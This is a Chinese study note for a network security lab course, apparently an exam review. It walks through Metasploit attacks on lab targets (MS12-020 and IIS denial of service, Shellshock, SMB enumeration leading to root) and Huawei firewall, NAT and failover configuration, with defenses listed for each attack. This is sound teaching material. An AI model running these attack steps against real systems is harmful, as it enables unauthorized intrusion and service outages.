# 02 - 网络安全实验

---

## 一、知识点总结

### 1. 渗透测试基础

- **渗透测试**（Penetration Test）：完全模拟黑客可能使用的攻击技术和漏洞发现技术，对目标系统安全做深入探测，发现最脆弱环节
- 信息收集分为**被动收集**（不与目标交互）和**主动收集**（需与目标交互）
- 渗透测试基本流程：信息收集 → 漏洞扫描 → 漏洞利用 → 权限提升 → 报告输出

### 2. 信息收集技术

| 类型 | 工具 | 用途 |
|------|------|------|
| 被动收集 | `whois`、`nslookup`、`phpinfo.me`、`Netcraft` | 域名注册信息、子域名、DNS解析 |
| 主动收集 | `nmap`、`metasploit`(`arp_sweep`)、`amap` | 存活主机、操作系统、端口服务 |
| 目录扫描 | `dirb`、`DirBuster`、`御剑` | Web敏感目录与后台路径 |
| 网站扫描 | `nikto`、`Burp Suite` | 漏洞检测、请求拦截分析 |

### 3. Metasploit 框架（MSF）

- `msfconsole`：打开Metasploit终端
- `search <关键字>`：搜索漏洞利用模块
- `use <模块路径>`：启用攻击/扫描模块
- `show options`：查看模块参数
- `set rhosts <IP>`：设置目标地址
- `run` / `exploit`：执行攻击

### 4. 漏洞类型

| 漏洞编号 | 类型 | 影响服务 | 危害 |
|----------|------|----------|------|
| `MS12-020` | RDP远程代码执行 | 远程桌面(3389) | 蓝屏DoS/远程代码执行 |
| `MS10-065` | IIS栈溢出 | IIS HTTP(80) | 服务崩溃DoS |
| `CVE-2019-0708`(BlueKeep) | RDP远程代码执行 | 远程桌面(3389) | 获取系统权限 |
| `MS17-010`(永恒之蓝) | SMB远程代码执行 | SMB(445) | 获取系统权限 |
| `MS08-067` | SMB远程代码执行 | SMB(445) | 反弹shell获取权限 |
| Shellshock | Bash远程代码执行 | HTTP/CGI(80) | 获取主机权限 |

### 5. 防火墙安全区域模型

- **Trust区域**：内网用户，信任级别高（85）
- **Untrust区域**：外网/Internet，信任级别低（5）
- **DMZ区域**：对外服务器区，信任级别中（50）
- **Local区域**：防火墙自身管理流量
- 安全策略优先级：**拒绝规则**优先于**允许规则**（先匹配先生效）

### 6. NAT 技术

- **源NAT（Source NAT）**：私网访问公网时转换源地址
  - `NAPT`（PAT）：端口地址转换，多个私网IP复用少量公网IP
- **目的NAT / NAT Server**：公网用户通过映射地址访问私网服务
- **ALG（应用层网关）**：处理FTP等多通道协议的NAT转换
- `ASPF`：应用层状态检测，配合ALG使用

### 7. 双机热备（VRRP + HRP）

- `VRRP`：虚拟路由冗余协议，提供虚拟网关IP
- `HRP`（Huawei Redundancy Protocol）：华为防火墙双机热备协议
- 主备模式：`active`（主）/ `standby`（备），通过VGMP管理优先级
- 心跳线：独立网段，用于主备同步和状态检测

### 8. 虚拟化防火墙

- `vsys`（Virtual System）：虚拟系统，将一台物理防火墙划分为多个逻辑防火墙
- `resource-class`：资源分配模板，控制会话数、策略数、带宽
- 虚拟系统间通信需通过**根系统**路由转发

## 二、实验操作步骤

### 实验一：Metasploitable3 靶机攻击

#### 1.1 MS12-020 RDP漏洞攻击

**环境准备：**
- 攻击机：Kali Linux（安装Metasploit框架）
- 靶机：Metasploitable3（Windows Server 2008，IP如 `192.168.1.251`）
- 确保两台虚拟机在同一网段

**攻击步骤：**

```
# 步骤1：扫描存活主机
nmap -sn 192.168.1.0/24

# 步骤2：详细扫描目标（操作系统识别 + 端口服务探测）
nmap -sS -sV -T4 -v -n --open --reason 192.168.1.251

# 步骤3：打开Metasploit
msfconsole

# 步骤4：搜索MS12-020相关模块
search ms12-020

# 步骤5：先用检测模块验证漏洞是否存在
use auxiliary/scanner/rdp/ms12_020_check
set rhosts 192.168.1.251
run

# 步骤6：使用攻击模块发起DoS攻击
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set rhosts 192.168.1.251
run
```

**预期结果：** 靶机蓝屏重启，DoS攻击成功

**防御方法：**
- 及时安装微软安全补丁 `KB2621440`
- 关闭不必要的RDP服务（3389端口）
- 使用防火墙限制3389端口的访问来源
- 启用网络级别认证（NLA）

#### 1.2 IIS 重复参数请求DoS攻击

**环境准备：**
- 攻击机：Kali Linux（安装Metasploit框架）
- 靶机：Metasploitable3（运行IIS服务，IP如 `192.168.220.141`，端口 `8022`）

**攻击步骤：**

```
# 步骤1：扫描存活主机
nmap -sn 192.168.220.0/24

# 步骤2：对目标进行信息收集
nmap -A 192.168.220.141

# 步骤3：打开Metasploit
msfconsole

# 步骤4：搜索IIS相关漏洞
search Microsoft IIS

# 步骤5：启用IIS DoS攻击模块
use auxiliary/dos/windows/http/ms10_065_ii6_asp_dos
show options

# 步骤6：设置目标参数
set rhosts 192.168.220.141
set rport 8022

# 步骤7：执行攻击
run
```

**验证方法：** 在靶机上打开任务管理器 → Performance，对比攻击前后CPU/内存占用变化

**防御方法：**
- 升级IIS至最新版本
- 限制ASP页面的请求参数长度
- 部署WAF（Web应用防火墙）过滤异常请求

#### 1.3 Shellshock漏洞利用（Sumo靶机）

**环境准备：**
- 攻击机：Kali Linux
- 靶机：Sumo（IP如 `192.168.1.254`，开放22和80端口）

**攻击步骤：**

```
# 步骤1：扫描存活主机
nmap -sn 192.168.1.0/24

# 步骤2：扫描端口和服务
nmap -T4 -A -p- -Pn -sV 192.168.1.254

# 步骤3：目录扫描
dirb http://192.168.1.254/

# 步骤4：使用nikto扫描，发现Shellshock漏洞
nikto -h http://192.168.1.254

# 步骤5：在Metasploit中搜索对应exploit
msfconsole
search shellshock

# 步骤6：设置参数并执行
use <对应模块路径>
set RHOSTS 192.168.1.254
exploit

# 步骤7：获取shell后提权
sysinfo
shell
```

**防御方法：**
- 升级Bash至已修复Shellshock的版本（4.3及以后）
- 检查并修复CGI脚本中对环境变量的处理

#### 1.4 West-Wild信息泄露漏洞

**环境准备：**
- 攻击机：Kali Linux
- 靶机：West-Wild-v1.1（IP如 `192.168.1.254`，开放22、80、139、445端口）

**攻击步骤：**

```
# 步骤1：全面扫描
nmap -T4 -A -p- -Pn -sV 192.168.1.254

# 步骤2：目录扫描
dirb http://192.168.1.254/

# 步骤3：SMB枚举（445端口开放）
enum4linux 192.168.1.254

# 步骤4：访问SMB共享（空密码）
smbclient //192.168.1.254/wave
dir
get FLAG1.txt

# 步骤5：解码获取的文件（Base64编码）
# 使用BurpSuite的Decoder模块解码，获得FLAG和用户名密码

# 步骤6：SSH登录
ssh <用户名>@192.168.1.254

# 步骤7：查找SUID提权路径
find / -writable -type d 2>/dev/null

# 步骤8：切换目录获取更多凭据
cd /usr/share/av/westsidesecret/
cat ififoregt.sh
# 获得用户名密码：aveng:kaizen+80

# 步骤9：使用新凭据SSH登录获取root权限
ssh aveng@192.168.1.254
```

**防御方法：**
- 禁止SMB匿名访问，设置强密码
- 定期审计共享目录权限
- 移除不必要的SUID程序
- 限制敏感文件的读取权限

### 实验二：防火墙配置实验

#### 2.1 华为防火墙安全策略与NAT配置

**环境准备：**
- 华为防火墙（eNSP模拟器）
- 内网PC（Trust区域，`172.16.1.0/24` 或 `10.1.1.0/24`）
- FTP服务器（DMZ区域，`10.2.0.8`）
- 公网测试设备（Untrust区域）

**安全策略配置步骤：**

```
# 场景1：内网访问外网（源NAT）

# 1. 配置接口IP
[FW] interface GigabitEthernet 0/0/0
[FW-GigabitEthernet0/0/0] ip address 172.16.1.254 255.255.255.0
[FW-GigabitEthernet0/0/0] quit
[FW] interface GigabitEthernet 1/0/0
[FW-GigabitEthernet1/0/0] ip address 1.1.1.1 255.255.255.0
[FW-GigabitEthernet1/0/0] quit

# 2. 划分安全区域
[FW] firewall zone trust
[FW-zone-trust] add interface GigabitEthernet 0/0/0
[FW-zone-trust] quit
[FW] firewall zone untrust
[FW-zone-untrust] add interface GigabitEthernet 1/0/0
[FW-zone-untrust] quit

# 3. 配置安全策略（禁止特定IP上网）
[FW] security-policy
[FW-policy-security] rule name block_ips
[FW-policy-security-rule-block_ips] source-zone trust
[FW-policy-security-rule-block_ips] destination-zone untrust
[FW-policy-security-rule-block_ips] source-address 172.16.1.1 32
[FW-policy-security-rule-block_ips] source-address 172.16.1.2 32
[FW-policy-security-rule-block_ips] source-address 172.16.1.3 32
[FW-policy-security-rule-block_ips] action deny

# 4. 允许其余内网访问外网
[FW-policy-security] rule name allow_subnet
[FW-policy-security-rule-allow_subnet] source-zone trust
[FW-policy-security-rule-allow_subnet] destination-zone untrust
[FW-policy-security-rule-allow_subnet] source-address 172.16.1.0 24
[FW-policy-security-rule-allow_subnet] action permit

# 5. 配置NAT地址池（PAT模式）
[FW] nat address-group group1
[FW-address-group-group1] mode pat
[FW-address-group-group1] section 0 1.1.1.10 1.1.1.15
[FW-address-group-group1] route enable
[FW-address-group-group1] quit

# 6. 配置源NAT策略
[FW] nat-policy
[FW-policy-nat] rule name nat_internet
[FW-policy-nat-rule-nat_internet] source-zone trust
[FW-policy-nat-rule-nat_internet] destination-zone untrust
[FW-policy-nat-rule-nat_internet] source-address 172.16.1.0 24
[FW-policy-nat-rule-nat_internet] action source-nat address-group group1
```

```
# 场景2：公网访问内网FTP服务器（NAT Server + ALG）

# 1. 安全策略
[FW] security-policy
[FW-policy-security] rule name ftp_access
[FW-policy-security-rule-ftp_access] source-zone untrust
[FW-policy-security-rule-ftp_access] destination-zone dmz
[FW-policy-security-rule-ftp_access] destination-address 10.2.0.8 32
[FW-policy-security-rule-ftp_access] action permit

# 2. NAT Server映射
[FW] nat server policy_ftp protocol tcp global 1.1.1.10 ftp inside 10.2.0.8 ftp

# 3. 开启FTP ASPF + ALG
[FW] firewall interzone dmz untrust
[FW-interzone-dmz-untrust] detect ftp
```

**验证命令：**

```
display security-policy hit          # 查看安全策略命中情况
display firewall session table       # 查看会话表
display nat address-group all        # 查看NAT地址池状态
display nat server                   # 查看NAT映射状态
display firewall server-map          # 查看FTP动态通道
telnet 1.1.1.10 21                   # 测试端口可达性
```

**防御要点：**
- 安全策略是NAT生效的前提，未放行的流量即使配置NAT也会被丢弃
- 多通道协议（如FTP）必须同时开启ASPF和ALG
- 配置顺序：安全区域 → 安全策略 → NAT策略

#### 2.2 双机热备配置（VRRP + HRP）

**环境准备：**
- 两台华为防火墙（FW1主、FW2备）
- 两台交换机 + 两台PC（内网PC1、外网PC3）
- IP规划：外网接口 `202.100.1.2/3`，虚拟网关 `202.100.1.254`
- 内网接口 `10.1.10.2/3`，虚拟网关 `10.1.10.254`
- 心跳接口：`10.10.0.1` / `10.10.0.2`（独立网段）

**配置步骤（FW1主设备）：**

```
# 1. 配置接口IP
[FW1] interface GigabitEthernet 0/0/0
[FW1-GigabitEthernet0/0/0] undo shutdown
[FW1-GigabitEthernet0/0/0] ip address 202.100.1.2 255.255.255.0
[FW1-GigabitEthernet0/0/0] quit
[FW1] interface GigabitEthernet 1/0/0
[FW1-GigabitEthernet1/0/0] undo shutdown
[FW1-GigabitEthernet1/0/0] ip address 10.1.10.2 255.255.255.0
[FW1-GigabitEthernet1/0/0] quit

# 2. VRRP配置（Active模式）
[FW1] interface GigabitEthernet 0/0/0
[FW1-GigabitEthernet0/0/0] vrrp vrid 1 virtual-ip 202.100.1.254 active
[FW1-GigabitEthernet0/0/0] vrrp vrid 1 priority 150
[FW1-GigabitEthernet0/0/0] quit
[FW1] interface GigabitEthernet 1/0/0
[FW1-GigabitEthernet1/0/0] vrrp vrid 2 virtual-ip 10.1.10.254 active
[FW1-GigabitEthernet1/0/0] vrrp vrid 2 priority 150
[FW1-GigabitEthernet1/0/0] quit

# 3. 划分安全区域
[FW1] firewall zone trust
[FW1-zone-trust] add interface GigabitEthernet 1/0/0
[FW1-zone-trust] quit
[FW1] firewall zone untrust
[FW1-zone-untrust] add interface GigabitEthernet 0/0/0
[FW1-zone-untrust] quit

# 4. 安全策略配置
[FW1] security-policy
[FW1-policy-security] rule name trust_to_untrust
[FW1-policy-security-rule-trust_to_untrust] source-zone trust
[FW1-policy-security-rule-trust_to_untrust] destination-zone untrust
[FW1-policy-security-rule-trust_to_untrust] service icmp tcp udp
[FW1-policy-security-rule-trust_to_untrust] action permit

# 5. 心跳线配置（接口加入DMZ区）
[FW1] interface GigabitEthernet 1/0/1
[FW1-GigabitEthernet1/0/1] ip address 10.10.0.1 255.255.255.0
[FW1-GigabitEthernet1/0/1] quit
[FW1] firewall zone dmz
[FW1-zone-dmz] add interface GigabitEthernet 1/0/1
[FW1-zone-dmz] quit
[FW1] security-policy
[FW1-policy-security] rule name allow_hrp
[FW1-policy-security-rule-allow_hrp] source-zone dmz
[FW1-policy-security-rule-allow_hrp] destination-zone dmz
[FW1-policy-security-rule-allow_hrp] action permit

# 6. 启用HRP
[FW1] hrp interface GigabitEthernet 1/0/1 remote 10.10.0.2
[FW1] hrp enable
[FW1] vgmp priority 150

# 7. 静态路由
[FW1] ip route-static 0.0.0.0 0.0.0.0 202.100.1.1
```

**验证命令：**

```
display vrrp           # 查看VRRP状态
display hrp state      # 查看HRP主备状态
ping 202.100.1.10      # 测试连通性
```

**故障切换验证：** 在主设备接口执行 `shutdown` 模拟故障，观察备设备是否接管

**防御要点：**
- 心跳接口必须使用**独立网段**，避免与业务网段冲突
- 主备设备的VGMP优先级应有明确差异
- 配置完成后需同步检查安全策略是否已同步到备设备

#### 2.3 虚拟化防火墙配置

**环境准备：**
- 华为防火墙（支持vsys功能）
- 两台交换机 + 两台PC

**配置步骤：**

```
# 1. 创建资源分配模板
[FW1] resource-class r1
[FW1-resource-class-r1] resource-item-limit session reserved-number 500 maximum 1000
[FW1-resource-class-r1] resource-item-limit policy reserved-number 200
[FW1-resource-class-r1] resource-item-limit bandwidth 5 entire

# 2. 创建虚拟系统
[FW1] vsys enable
[FW1] vsys name vsys1
[FW1-vsys-vsys1] assign resource-class r1
[FW1-vsys-vsys1] assign interface g1/0/0

# 3. 根系统安全策略
[FW1] security-policy
[FW1-policy-security] rule name trust_to_untrust
[FW1-policy-security-rule-trust_to_untrust] source-zone trust
[FW1-policy-security-rule-trust_to_untrust] destination-zone untrust
[FW1-policy-security-rule-trust_to_untrust] source-address 10.3.2.1 24
[FW1-policy-security-rule-trust_to_untrust] service icmp
[FW1-policy-security-rule-trust_to_untrust] action permit

# 4. 虚拟-根路由（虚拟系统通过根系统访问外部）
# 在虚拟系统内配置：
ip route-static 0.0.0.0 0 public

# 5. 虚拟-虚拟路由（跨虚拟系统互通）
# 在根系统配置：
ip route-static vpn-instance vsys2 10.3.1.0 255.255.255.0 vpn-instance vsys1
```

**验证命令：**

```
display policy-security rule name trust_to_untrust
ping 10.1.255.2
```

**防御要点：**
- 禁用风险服务（如Telnet），限制SSH加密算法
- 每个虚拟系统应有独立的安全策略
- 虚拟系统间通信需在根系统配置路由和安全策略放行

### 实验三：漏洞扫描实验

#### 3.1 信息收集（主动 + 被动）

**环境准备：**
- Kali Linux（安装`nmap`、`whois`、`dirb`、`nikto`等工具）
- 目标网站或内网靶机

**操作步骤：**

```
# 被动信息收集
# 1. Whois查询
whois baidu.com

# 2. DNS解析
nslookup baidu.com

# 3. 子域名收集（使用在线工具phpinfo.me或站长之家）

# 主动信息收集
# 4. 活跃主机扫描（ARP扫描）
msfconsole
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.159.0/24
run

# 5. ICMP扫描
nmap -sP 192.168.159.0/24

# 6. 操作系统识别
nmap -O 192.168.222.134

# 7. 全端口扫描
nmap -p- 192.168.159.190

# 8. 服务指纹识别
amap 192.168.159.190 80

# 9. Web目录爆破
dirb http://192.168.159.190/ /usr/share/dirb/wordlists/big.txt

# 10. Robots.txt分析
# 浏览器访问 http://目标/robots.txt
```

**防御方法：**
- 配置IDS/IPS检测异常扫描行为
- 限制ICMP响应频率
- 关闭不必要的服务端口
- 配置`robots.txt`隐藏敏感目录

#### 3.2 漏洞扫描与利用（综合）

**环境准备：**
- Kali Linux
- 靶机（如West-Wild、Sumo等）

**操作步骤：**

```
# 1. 全面端口扫描
nmap -T4 -A -p- -Pn -sV <目标IP>

# 2. Web漏洞扫描
nikto -h http://<目标IP>

# 3. 目录扫描
dirb http://<目标IP>/

# 4. SMB枚举（445端口开放时）
enum4linux <目标IP>

# 5. 根据扫描结果选择对应Metasploit模块进行利用
```

## 三、常见问题与排错

### 1. Metasploit相关

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| `search`找不到模块 | MSF数据库未初始化 | 执行 `msfdb init` 后重启 `msfconsole` |
| `run`后无响应 | 目标端口未开放或被防火墙拦截 | 先用 `nmap` 确认端口状态 |
| 攻击模块执行失败 | 参数设置错误 | 用 `show options` 检查所有必填参数 |
| Shell连接不稳定 | 网络环境或防火墙干扰 | 尝试使用 `reverse_tcp` 类型的payload |

### 2. 防火墙配置相关

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| 配置NAT后仍无法上网 | 安全策略未放行 | 先配置安全策略，再配置NAT |
| `The interface has been added to xxx zone` | 接口已加入其他区域 | 先 `undo` 原区域的接口绑定 |
| `Ambiguous command` | 命令缩写不唯一 | 输入更完整的命令关键字 |
| FTP多通道传输失败 | 未开启ASPF/ALG | 执行 `detect ftp` 开启FTP检测 |
| HRP状态异常 | 心跳线配置错误 | 检查心跳接口IP和remote地址是否正确 |
| VRRP主备不切换 | 优先级配置问题 | 确认主设备优先级高于备设备 |

### 3. 漏洞扫描相关

| 问题 | 原因 | 解决方法 |
|------|------|----------|
| `nmap`扫描结果不全 | 扫描参数不够全面 | 使用 `-p- -sV -A` 全面扫描 |
| `dirb`扫描速度慢 | 字典文件过大 | 使用更小的字典或指定扫描深度 |
| `smbclient`连接被拒 | 共享需要认证 | 先用 `enum4linux` 枚举可用凭据 |
| `nikto`误报较多 | 工具特性 | 结合多个工具交叉验证 |

### 4. 通用问题

| 问题 | 解决方法 |
|------|----------|
| 虚拟机间网络不通 | 检查网卡模式（桥接/NAT/仅主机）是否一致 |
| IP地址冲突 | 规划好网段，避免虚拟网卡占用靶机IP |
| 工具未安装 | 使用 `apt install <工具名>` 或在Kali中使用 `apt update && apt upgrade` |

## 四、速记口诀

### 渗透测试流程口诀

> **"信扫漏利报"** — 信息收集 → 扫描探测 → 漏洞发现 → 利用攻击 → 报告输出

### MSF操作口诀

> **"搜用看设跑"** — `search`搜索 → `use`启用 → `show options`看参数 → `set`设置 → `run`执行

### 防火墙配置顺序口诀

> **"区策NAT"** — 先划安全区域 → 再配安全策略 → 最后配NAT策略
>
> **口诀：安全策略是NAT的"通行证"，没策略的NAT是"空壳"**

### NAT类型区分口诀

> **"源出去，目的进"** — 源NAT让内网出去（私→公），目的NAT让外网进来（公→私）
>
> **"PAT省地址，ALG通多通道"** — NAPT端口复用省公网IP，ALG处理FTP等多通道协议

### 双机热备口诀

> **"VRRP管网关，HRP管状态，心跳线不能断"**
>
> **"主active备standby，优先级高者为王"**

### 安全区域口诀

> **"信内不信外，DMZ居中间"**
>
> Trust(85) → DMZ(50) → Untrust(5)，数字越大越信任

### 信息收集口诀

> **"被动看公开，主动扫端口"**
>
> 被动：whois、DNS、搜索引擎；主动：nmap、dirb、nikto

### 漏洞利用选择口诀

> **"先扫端口再选洞，3389找RDP，445找SMB，80找Web"**
>
> - 3389端口 → `MS12-020` / `BlueKeep`
> - 445端口 → `MS17-010` / `MS08-067`
> - 80端口 → `IIS漏洞` / `Shellshock`

---

> **实验核心要点总结：**
> 1. 信息收集是渗透测试的基础，"知己知彼"才能精准打击
> 2. Metasploit是漏洞利用的核心工具，熟练掌握模块搜索和参数配置
> 3. 防火墙配置遵循"区域→策略→NAT"三步走
> 4. 安全策略优先于NAT，未放行的流量NAT无效
> 5. 双机热备靠VRRP+HRP，心跳线是生命线
> 6. 任何实验操作都应在**授权环境**中进行，禁止未授权渗透测试
